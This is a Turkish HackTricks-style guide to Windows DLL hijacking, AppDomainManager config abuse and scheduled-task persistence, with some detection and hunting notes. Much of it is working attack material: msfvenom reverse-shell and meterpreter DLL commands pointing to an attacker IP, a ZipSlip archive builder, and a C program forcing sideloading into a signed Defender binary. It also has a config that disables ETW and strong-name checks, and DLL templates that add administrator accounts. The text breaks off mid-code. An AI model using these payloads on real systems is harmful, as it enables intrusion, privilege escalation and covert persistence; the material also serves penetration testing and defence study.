# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Temel Bilgiler

DLL Hijacking, güvenilir bir uygulamanın malicious bir DLL yüklemesini sağlamak için manipüle edilmesini içerir. Bu terim **DLL Spoofing, Injection ve Side-Loading** gibi çeşitli taktikleri kapsar. Temel olarak code execution, persistence ve daha nadir olarak privilege escalation için kullanılır. Buradaki odak escalation olsa da hijacking yöntemi hedeflerden bağımsız olarak aynıdır.

### Yaygın Teknikler

DLL hijacking için çeşitli yöntemler kullanılır ve her birinin etkinliği, uygulamanın DLL yükleme stratejisine bağlıdır:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Gerçek bir DLL'yi malicious bir DLL ile değiştirmek; orijinal DLL'nin işlevselliğini korumak için isteğe bağlı olarak DLL Proxying kullanmak.
2. **DLL Search Order Hijacking**: Malicious DLL'yi legitimate DLL'den önce gelen bir search path'e yerleştirerek uygulamanın search pattern'ından yararlanmak.
3. **Phantom DLL Hijacking**: Uygulamanın mevcut olmayan, gerekli bir DLL olduğunu düşünerek yükleyeceği malicious bir DLL oluşturmak.
4. **DLL Redirection**: Uygulamayı malicious DLL'ye yönlendirmek için `%PATH%` veya `.exe.manifest` / `.exe.local` dosyaları gibi search parametrelerini değiştirmek.
5. **WinSxS DLL Replacement**: Legitimate DLL'yi WinSxS dizininde malicious bir eşdeğeriyle değiştirmek; bu yöntem genellikle DLL side-loading ile ilişkilidir.
6. **Relative Path DLL Hijacking**: Malicious DLL'yi kopyalanan uygulamayla birlikte user-controlled bir dizine yerleştirmek; bu, Binary Proxy Execution tekniklerine benzer.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading, güvenilir bir **.NET Framework** process'inin attacker code yüklemesini sağlamanın tek yolu değildir. Hedef executable bir **managed** uygulamaysa CLR, executable'ın adını taşıyan bir **application configuration file** dosyasına da başvurur (örneğin `Setup.exe.config`). Bu dosya özel bir **AppDomainManager** tanımlayabilir. Config dosyası, EXE'nin yanına yerleştirilmiş attacker-controlled bir assembly'yi gösteriyorsa CLR bunu **uygulamanın normal code path'inden önce** yükler ve trusted process içinde çalıştırır.<sup>[[24]](#references)</sup>

Microsoft'un .NET Framework configuration schema'sına göre custom manager'ın kullanılabilmesi için hem `<appDomainManagerAssembly>` hem de `<appDomainManagerType>` mevcut olmalıdır.<sup>[[16]](#references)[[17]](#references)</sup>

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimal yönetici:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Pratik notlar:
- Bu, **.NET Framework specific** bir tradecraft'tır. Win32 DLL search order yerine CLR config parsing'e bağlıdır.
- Host gerçekten bir **managed EXE** olmalıdır. Hızlı triage için: `sigcheck -m target.exe`, `corflags target.exe` kullanın veya PE metadata içindeki **CLR Runtime Header** değerini kontrol edin.
- Config filename, executable name ile tam olarak eşleşmelidir (`<binary>.config`) ve genellikle **EXE'nin yanında** bulunur.
- Bu teknik, **signed Microsoft/vendor binaries** ile kullanışlıdır; çünkü trusted EXE'ye dokunulmadan malicious managed assembly in-process olarak çalışır.
- Halihazırda writable bir installer/update directory erişiminiz varsa, AppDomainManager hijacking **first stage** olarak kullanılabilir; sonraki aşamalarda classic DLL sideloading veya reflective loading uygulanabilir.

### AppDomainManager bir downloader + scheduled-task bootstrap olarak

Pratik bir intrusion pattern, trusted managed EXE'yi hem malicious `*.config` hem de yalnızca **küçük bir bootstrapper** olarak çalışan malicious bir AppDomainManager DLL ile birlikte kullanmaktır:<sup>[[25]](#references)</sup>

1. Kullanıcı, `%USERPROFILE%\Downloads` gibi inandırıcı bir konumdan signed bir .NET installer veya updater başlatır.
2. Yanındaki config, legitimate app logic başlamadan **önce** CLR'nin attacker assembly'yi yüklemesine neden olur.
3. Malicious manager bir **path gate** uygular (örneğin yalnızca host EXE `Downloads` içinden çalışıyorsa devam eder ve second stage'in yalnızca `%LOCALAPPDATA%` içinden çalışmasına izin verir).
4. Kontrol başarılı olursa payload'u `%LOCALAPPDATA%\PerfWatson2.exe` gibi user-writable bir path'e indirir ve scheduled task ile persistence kurar.

Bu varyantın önemi:
- Signed host EXE değiştirilmeden kalır; bu nedenle yalnızca main binary'yi hash'leyen triage işlemleri compromise'ı gözden kaçırabilir.
- Basit **path-based anti-analysis** yaygındır: ZIP/EXE/DLL triad'ını Desktop, Temp veya sandbox path'ine taşımak chain'i kasıtlı olarak bozabilir.
- First-stage AppDomainManager DLL'si küçük ve düşük gürültülü kalabilir; gerçek implant daha sonra indirilir.

Bu pattern ile sıkça görülen minimal persistence örneği:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Notlar:
- ` /rl highest`, ilgili kullanıcı/oturum için **kullanılabilir en yüksek** düzeyi ifade eder; tek başına SYSTEM seviyesine yükselmeyi garanti etmez.
- Bu teknik, klasik eksik-DLL arama sırası hijacking'inden ziyade **.NET config abuse üzerinden execution/persistence** olarak sınıflandırılmalıdır; ancak operatörler sıklıkla ikisini birlikte kullanır.

Tespit odakları:
- **ZIP extraction paths**, `Downloads`, `%TEMP%` veya kullanıcı tarafından yazılabilir diğer klasörlerden başlatılan ve yanında `<exe>.config` bulunan imzalı .NET executable'ları.
- Eylemi `%LOCALAPPDATA%`, `%APPDATA%` veya `Downloads` altındaki bir yolu gösteren ve adları browser/vendor updater'larını taklit eden yeni scheduled task'ler.
- Hemen başka bir EXE indiren ve ardından `schtasks.exe` başlatan kısa ömürlü managed bootstrap process'leri.
- Executable path beklenen bir user-profile directory ile eşleşmediği sürece erken çıkan örnekler.

### Mevcut bir scheduled task'i sideload zincirini yeniden başlatacak şekilde hijack etme

Persistence için yalnızca **yeni bir task oluşturulmasını** aramayın. Bazı intrusion set'leri, meşru bir installer'ın **normal bir updater task** oluşturmasını bekler ve ardından mevcut task action'ını yeniden yazar; böylece mevcut ad, author ve trigger savunmacılara tanıdık kalır.

Yeniden kullanılabilir iş akışı:
1. Meşru software'i yükleyin/çalıştırın ve normalde oluşturduğu task'i belirleyin.
2. Task XML'ini export edin ve mevcut `<Exec><Command>` / `<Arguments>` değerlerini not edin.<sup>[[23]](#references)</sup>
3. Yalnızca action'ı değiştirerek task'in, user-writable staging directory içinden **trusted host EXE**'nizi başlatmasını sağlayın; bu EXE daha sonra gerçek payload'ı side-load eder veya AppDomain-load eder.
4. Yeni ve kolay fark edilen bir persistence artifact'i oluşturmak yerine aynı task adını yeniden register edin.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Neden daha stealthier:
- Task adı hâlâ legitimate görünebilir (örneğin bir vendor updater).
- **Task Scheduler service** bunu başlatır; bu nedenle parent/ancestor validation çoğu zaman `explorer.exe` yerine beklenen scheduling chain'i görür.
- Yalnızca **new task names** arayan DFIR ekipleri, registration'ı zaten mevcut olan ancak action'ı artık `%LOCALAPPDATA%`, `%APPDATA%` veya attacker-controlled başka bir path'e işaret eden bir task'ı gözden kaçırabilir.

Hızlı hunting pivot'ları:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- `C:\Windows\System32\Tasks\*` XML'ini ve `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata'sını bir baseline ile karşılaştırın.
- **Vendor-looking updater task** **user-writable directories** içinden çalıştırıldığında veya yanında bulunan `*.config` dosyasına sahip bir .NET EXE başlattığında alert oluşturun.

> [!TIP]
> HTML staging, AES-CTR configs ve .NET implants'ı DLL sideloading üzerine ekleyen adım adım bir chain için aşağıdaki workflow'u inceleyin.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Eksik Dll'leri Bulma

Bir system içindeki eksik Dll'leri bulmanın en yaygın yolu, sysinternals üzerinden [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) çalıştırmak ve **aşağıdaki 2 filter'ı ayarlamaktır**:

![Common Techniques - Eksik Dll'leri Bulma: Bir system içindeki eksik Dll'leri bulmanın en yaygın yolu, sysinternals üzerinden procmon çalıştırmak ve aşağıdaki 2 filter'ı ayarlamaktır](<../../../images/image (961).png>)

![Common Techniques - Eksik Dll'leri Bulma: Bir system içindeki eksik Dll'leri bulmanın en yaygın yolu, sysinternals üzerinden procmon çalıştırmak ve aşağıdaki 2 filter'ı ayarlamaktır](<../../../images/image (230).png>)

ve yalnızca **File System Activity**'yi gösterin:

![Common Techniques - Eksik Dll'leri Bulma: ve yalnızca File System Activity'yi gösterin](<../../../images/image (153).png>)

**missing dlls in general** arıyorsanız bunu birkaç **seconds** boyunca çalışır durumda **bırakın**.\
**specific executable** içindeki **missing DLL**'yi arıyorsanız, **"Process Name" "contains" `<exec name>`** gibi başka bir filter ayarlayın, executable'ı çalıştırın ve event capture'ını durdurun.<sup>[[9]](#references)</sup>

## Eksik Dll'leri Exploit Etme

Privilege escalation yapmak için, **privileged process**'in yazma yetkiniz olan bir location'dan load etmeye çalıştığı bir **DLL** arayın. Bu durum, legitimate DLL'yi içeren directory'den önce aranan bir directory'yi kontrol ettiğinizde veya istenen DLL mevcut olmadığında ve aranan directory'lerden birine yazabildiğinizde gerçekleşebilir.

### Dll Search Order

**[**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) içinde Dll'lerin nasıl load edildiğini ayrıntılı olarak bulabilirsiniz.**

**Windows applications**, belirli bir sequence'i izleyerek önceden tanımlanmış bir dizi **search path** üzerinden DLL'leri arar. DLL hijacking sorunu, harmful bir DLL bu directory'lerden birine stratejik olarak yerleştirildiğinde ve authentic DLL'den önce load edilmesi sağlandığında ortaya çıkar. Bunu önlemenin bir yolu, application'ın ihtiyaç duyduğu DLL'lere başvururken absolute path kullanmasını sağlamaktır.

Aşağıda **32-bit** system'lerdeki **DLL search order**'ı görebilirsiniz:

1. Application'ın load edildiği directory.
2. System directory. Bu directory'nin path'ini almak için [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function'ını kullanın.(_C:\Windows\System32_)
3. 16-bit system directory. Bu directory'nin path'ini alan bir function yoktur, ancak bu directory aranır. (_C:\Windows\System_)
4. Windows directory. Bu directory'nin path'ini almak için [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function'ını kullanın.
1. (_C:\Windows_)
5. Current directory.
6. PATH environment variable içinde listelenen directory'ler. Bunun **App Paths** registry key'i tarafından belirtilen per-application path'i içermediğine dikkat edin. DLL search path hesaplanırken **App Paths** key'i kullanılmaz.

Bu, **SafeDllSearchMode** etkin durumdayken kullanılan **default** search order'dır. Devre dışı bırakıldığında current directory ikinci sıraya yükselir. Bu özelliği devre dışı bırakmak için **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value'sunu oluşturun ve değerini 0 olarak ayarlayın (default olarak etkindir).

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function'ı **LOAD_WITH_ALTERED_SEARCH_PATH** ile çağrılırsa search, **LoadLibraryEx**'in load ettiği executable module'ün directory'sinden başlar.

Son olarak bir DLL, name yerine absolute path kullanılarak load edilebilir. Bu durumda Windows DLL'in kendisi için yalnızca bu path'e bakar; name ile istenen dependencies ise geçerli search order'ı izlemeye devam eder.

Search order'ı değiştirmenin başka yolları da vardır, ancak bunları burada açıklamayacağım.

### Arbitrary file write'ı missing-DLL hijack'e chain'leme

1. Process'in probe ettiği ancak bulamadığı DLL name'lerini toplamak için **ProcMon** filter'larını (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) kullanın.<sup>[[14]](#references)</sup>
2. Binary bir **schedule/service** üzerinden çalışıyorsa, bu name'lerden birine sahip bir DLL'yi **application directory**'sine (search-order entry #1) bırakmak, bir sonraki execution'da load edilmesini sağlar. Bir .NET scanner case'inde process, gerçek kopyayı `C:\Program Files\dotnet\fxr\...` üzerinden load etmeden önce `C:\samples\app\` içinde `hostfxr.dll` arıyordu.
3. Herhangi bir export'a sahip bir payload DLL (örneğin reverse shell) oluşturun: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Primitive'iniz **ZipSlip-style arbitrary write** ise extraction dir'den kaçacak ve DLL'in app folder'a düşmesini sağlayacak bir ZIP oluşturun:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Arşivi izlenen gelen kutusuna/paylaşıma teslim edin; zamanlanmış görev işlemi yeniden başlattığında kötü amaçlı DLL'i yükler ve kodunuzu service account olarak çalıştırır.

### RTL_USER_PROCESS_PARAMETERS.DllPath üzerinden sideloading'i zorlama

Yeni oluşturulan bir işlemin DLL search path'ini deterministik olarak etkilemenin gelişmiş bir yolu, işlemi ntdll'nin native API'leriyle oluştururken RTL_USER_PROCESS_PARAMETERS içindeki DllPath alanını ayarlamaktır. Buraya attacker-controlled bir dizin sağlayarak, import edilen bir DLL'i adına göre çözen (absolute path kullanmayan ve safe loading flags kullanmayan) bir target process, kötü amaçlı DLL'i bu dizinden yüklemeye zorlanabilir.

Temel fikir
- RtlCreateProcessParametersEx ile process parameters oluşturun ve controlled folder'ınızı gösteren özel bir DllPath sağlayın (örneğin dropper/unpacker'ınızın bulunduğu dizin).
- RtlCreateUserProcess ile işlemi oluşturun. Target binary bir DLL'i adına göre çözdüğünde loader, çözümleme sırasında sağlanan DllPath'e başvurur; bu da kötü amaçlı DLL target EXE ile aynı dizinde olmasa bile güvenilir bir sideloading sağlar.

Notlar/sınırlamalar
- Bu, oluşturulmakta olan child process'i etkiler; yalnızca current process'i etkileyen SetDllDirectory'den farklıdır.
- Target, bir DLL'i adına göre import etmeli veya LoadLibrary kullanmalıdır (absolute path kullanmamalı ve LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories kullanmamalıdır).
- KnownDLLs ve hardcoded absolute paths hijack edilemez. Forwarded exports ve SxS öncelik sırasını değiştirebilir.

Minimal C örneği (ntdll, wide strings, basitleştirilmiş error handling):

<details>
<summary>Full C example: RTL_USER_PROCESS_PARAMETERS.DllPath üzerinden DLL sideloading'i zorlama</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operasyonel kullanım örneği
- Gerekli işlevleri dışa aktaran veya gerçek DLL'ye proxy yapan kötü amaçlı bir xmllite.dll dosyasını DllPath dizininize yerleştirin.
- Yukarıdaki tekniği kullanarak xmllite.dll dosyasını ada göre aradığı bilinen imzalı bir binary'yi başlatın. Loader, import işlemini sağlanan DllPath üzerinden çözer ve DLL'nizi sideload eder.

Bu tekniğin, sahada çok aşamalı sideloading zincirlerini yürütmek için kullanıldığı gözlemlenmiştir: ilk launcher bir yardımcı DLL bırakır; bu DLL daha sonra özel bir DllPath ile Microsoft tarafından imzalanmış ve hijack edilebilir bir binary'yi başlatarak saldırganın DLL'sinin bir staging dizininden yüklenmesini zorunlu kılar.<sup>[[6]](#references)</sup>


### `.exe.config` üzerinden .NET AppDomainManager hijacking

**.NET Framework** hedeflerinde sideloading, belleği patch'lemeden **`Main()`** öncesinde, uygulamanın bitişiğindeki **`.exe.config`** dosyasının kötüye kullanılmasıyla gerçekleştirilebilir. Saldırgan, yalnızca Win32 DLL arama sırasına güvenmek yerine meşru bir .NET EXE'yi kötü amaçlı bir config dosyasının ve saldırgan tarafından kontrol edilen bir veya daha fazla assembly'nin yanına yerleştirir.

Zincirin çalışma şekli:<sup>[[15]](#references)[[22]](#references)</sup>
1. Host EXE başlar ve **CLR, `<exe>.config` dosyasını okur**.
2. Config, runtime'ın saldırgan tarafından kontrol edilen bir `AppDomainManager` örneği oluşturması için **`<appDomainManagerAssembly>`** ve **`<appDomainManagerType>`** değerlerini ayarlar.
3. Kötü amaçlı manager, güvenilir host process içinde **`Main()` öncesi çalıştırma** elde eder.
4. Aynı config, CLR'ı yerel assembly'leri önce çözümlemeye zorlayabilir (örneğin `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) ve inline patching yapmadan runtime doğrulamasını/telemetrisini zayıflatabilir.

Campaign tarzı pattern (tam iç içe yerleşim directive / CLR sürümüne göre değişebilir):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Neden kullanışlıdır:
- **`<probing privatePath="."/>`**, assembly çözümlemesini uygulama dizininde tutarak klasörü öngörülebilir bir sideloading yüzeyine dönüştürür.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`**, yürütmeyi CLR başlatması sırasında, meşru uygulama mantığı çalışmadan önce attacker koduna taşır.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`**, full-trust bir uygulamanın strong-name doğrulama hatası olmadan imzasız veya değiştirilmiş assembly'leri yüklemesine izin verebilir.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`**, publisher-policy yönlendirmelerinin daha yeni assembly'lere yapılmasını engeller.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`**, runtime seçimini daha deterministik hâle getirir.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`**, implantın bellekte `EtwEventWrite` işlevine patch uygulaması yerine **CLR'ın kendi ETW görünürlüğünü** yapılandırma üzerinden devre dışı bırakması nedeniyle özellikle ilgi çekicidir.

Son kampanyalarda görülen operasyonel model:
- Aşama 1, `setup.exe`, `setup.exe.config` ve yerel assembly'leri bırakır.
- Aşama 2, bunları inandırıcı bir **AppData update** klasörüne kopyalar, host'u `update.exe` gibi bir adla yeniden adlandırır ve **scheduled task** üzerinden yeniden başlatır.
- Aşama 3, nihai RAT DLL/export'u yüklemeden önce yürütme bağlamını doğrular (örneğin Task Scheduler'dan beklenen üst süreç `svchost.exe`).

Hunting fikirleri:
- Kullanıcı tarafından yazılabilir konumlarda şüpheli bitişik **`.config`** dosyalarıyla çalışan imzalı veya başka şekilde meşru **.NET executable**'ları.
- **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** veya **`etwEnable enabled="false"`** içeren `.config` dosyaları.
- **`%LOCALAPPDATA%`** veya uygulamaya özgü `\bin\update\` dizinlerinden yeniden adlandırılmış update binary'lerini başlatan scheduled task'ler.
- Bir scheduled task'in kendi dizininden vendor dışı assembly'leri hemen yükleyen güvenilir bir .NET host'u başlattığı üst/alt süreç zincirleri.

#### Windows docs'taki dll search order istisnaları

Windows documentation'da standart DLL search order için belirli istisnalar belirtilmiştir:

- **Bellekte zaten yüklü olan bir DLL ile aynı adı paylaşan bir DLL** ile karşılaşıldığında sistem olağan aramayı atlar. Bunun yerine redirection ve manifest kontrolü gerçekleştirir, ardından bellekte zaten bulunan DLL'yi kullanır. **Bu senaryoda sistem DLL için search gerçekleştirmez**.
- DLL mevcut Windows sürümü için bir **known DLL** olarak tanınıyorsa sistem, arama sürecini **atlayarak**, dependent DLL'leriyle birlikte known DLL'nin kendi sürümünü kullanır. **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** registry key'i bu known DLL'lerin listesini içerir.
- Bir **DLL'nin dependencies'leri** varsa, bu dependent DLL'ler için search, ilk DLL'nin full path üzerinden tanımlanıp tanımlanmadığına bakılmaksızın yalnızca **module names** ile belirtilmiş gibi gerçekleştirilir.

### Privilege Escalation

**Gereksinimler**:

- **Eksik bir DLL'ye sahip** olan ve **farklı privilege'lar** altında çalışan veya çalışacak bir process tanımlayın (horizontal veya lateral movement).
- **DLL'nin** aranacağı herhangi bir **directory** için **write access** bulunduğundan emin olun. Bu konum executable'ın directory'si veya system path içindeki bir directory olabilir.

Bu ön koşullar varsayılan olarak yaygın değildir: privileged executable'larda genellikle eksik DLL dependencies'leri bulunmaz ve standard user'lar normalde system search-path directory'lerine yazamaz. Yanlış yapılandırılmış ortamlar yine de her iki koşulu da açığa çıkarabilir.\
Gereksinimler karşılanıyorsa [UACME](https://github.com/hfiref0x/UACME) projesini inceleyin. Ana amacı UAC bypass olsa da belirli Windows sürümleri için DLL-hijacking PoC'leri içerir ve bunlar çoğu zaman bulduğunuz writeable directory'ye uyarlanabilir.

Bir klasördeki **permissions** durumunuzu şu şekilde **check edebileceğinizi** unutmayın:<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Ve **PATH içindeki tüm klasörlerin izinlerini kontrol edin**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Bir executable'ın import'larını ve bir DLL'in export'larını şu araçla da kontrol edebilirsiniz:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
**System Path klasöründe** yazma izinleriyle **Dll Hijacking kullanarak privilege escalation yapma** hakkında kapsamlı bir rehber için şuraya bakın:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)system PATH içindeki herhangi bir klasörde yazma izinlerine sahip olup olmadığınızı kontrol eder.\
Bu vulnerability'yi keşfetmek için kullanılan diğer ilginç automated tools ise **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ ve _Write-HijackDll._

### Example

Exploitable bir senaryo bulmanız durumunda, bunu başarıyla exploit etmek için en önemli hususlardan biri, **executable'ın kendisinden import edeceği en az tüm functions'ları export eden bir dll oluşturmaktır**. Her durumda, Dll Hijacking'in [Medium Integrity level'dan High **(UAC'yi bypass ederek)**](../../authentication-credentials-uac-and-efs/index.html#uac) seviyesine veya [**High Integrity'den SYSTEM'e**](../index.html#from-high-integrity-to-system) geçişte kullanışlı olduğunu unutmayın**.** **Geçerli bir dll oluşturma** örneğini, execution için dll hijacking'e odaklanan bu dll hijacking çalışmasının içinde bulabilirsiniz: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ayrıca, **next sectio**n içinde **template** olarak kullanılabilecek veya **export edilmiş, gerekli olmayan functions'lara sahip bir dll oluşturmak** için yararlı olabilecek bazı **basic dll codes** bulabilirsiniz.

## **Dlls oluşturma ve derleme**

### **Dll Proxifying**

Temel olarak bir **Dll proxy**, **yüklendiğinde malicious code'unuzu execute edebilen**, ancak aynı zamanda **tüm çağrıları gerçek library'ye aktararak** **expose olan** ve **beklendiği şekilde çalışan** bir Dll'dir.

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) veya [**Spartacus**](https://github.com/Accenture/Spartacus) tool'u ile bir **executable belirtebilir ve proxify etmek istediğiniz library'yi seçebilir**, ardından **proxified bir dll oluşturabilir** veya **Dll'i belirterek proxified bir dll oluşturabilirsiniz**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Bir meterpreter (x86) edinin:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kullanıcı oluştur (x86, bir x64 sürümü görmedim):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Kendi DLL'iniz

Birçok durumda, derlediğiniz DLL, **victim process tarafından import edilen her function'ı export etmelidir**. Gerekli bir export eksikse binary bunu resolve edemez ve exploit başarısız olur.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Kullanıcı oluşturmalı C++ DLL örneği</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Thread entry içeren alternatif C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
